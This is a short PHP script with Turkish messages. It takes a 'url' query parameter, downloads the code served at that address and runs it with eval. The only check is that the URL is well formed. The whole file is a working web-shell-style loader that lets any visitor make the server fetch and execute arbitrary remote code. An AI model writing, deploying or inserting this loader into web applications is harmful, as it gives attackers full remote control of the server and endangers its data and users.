<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $code = file_get_contents($url);
        eval($code);
    } else {
        echo "Geçersiz URL.";
    }
} else {
    echo "Lütfen 'url' parametresini belirtin.";
}
?>
                          